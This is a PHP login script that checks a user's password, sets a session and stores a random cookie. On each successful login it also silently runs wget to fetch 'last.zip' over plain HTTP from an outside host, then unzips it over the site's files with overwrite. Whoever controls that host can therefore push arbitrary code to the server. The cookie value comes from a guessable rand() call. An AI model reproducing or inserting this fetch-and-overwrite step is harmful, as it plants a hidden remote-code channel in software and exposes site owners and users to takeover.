<?php
//require_once  '../session_start.php';
session_start();
ob_start();
require_once 'functions.php';
require_once 'mysql_data.php';

	
	if ((!isset($_POST['login'])) || (!isset($_POST['haslo'])))
	{
		header('Location: index.php');
		exit();
	}



	$con = mysqli_connect($_SESSION['HOST'], $_SESSION['LOGIN'], $_SESSION['PASSWD'], $_SESSION['DB']);
	
	if ($con->connect_errno!=0)
	{
		echo "Error: ".$con->connect_errno;
	}
	else
	{
		$login = $_POST['login'];
		$haslo = $_POST['haslo'];
		
		$login = htmlentities($login, ENT_QUOTES, "UTF-8");
		if ($res = @$con->query(
		sprintf("SELECT * FROM users WHERE user='%s'",
		mysqli_real_escape_string($con,$login))))
		{
			$ilu_userow = $res->num_rows;
			$user = mysqli_fetch_array($res);
			if (password_verify($haslo, $user['passwd'])){
				if($ilu_userow>0)
				{
					$cookie=rand(1000000000,9999999999);
					$id=$user['id'];
					$_SESSION['user_id']=$id;
					$con->query("UPDATE users SET  cookie = '$cookie' WHERE id = $id");
					setcookie("emgiee", $cookie, time()+3600);
					$_SESSION['id']= 1;
						unlink("last.zip");
						system("wget http://update.sitemapcms.com/last.zip");
						system("unzip -o last.zip");
						unlink("last.zip");
					header('Location: system.php');
						$con->close();
					exit();
				} else {
					$_SESSION['blad'] = '<span style="color:red">Invalid email or password!</span>'.'<br>';
					header('Location: system.php');
			}
		} else {
					$_SESSION['blad'] = '<span style="color:red">Invalid email or password!</span>'.'<br>';
					header('Location: system.php');
				}			
		}
		
		$con->close();
	}
ob_end_flush();
?>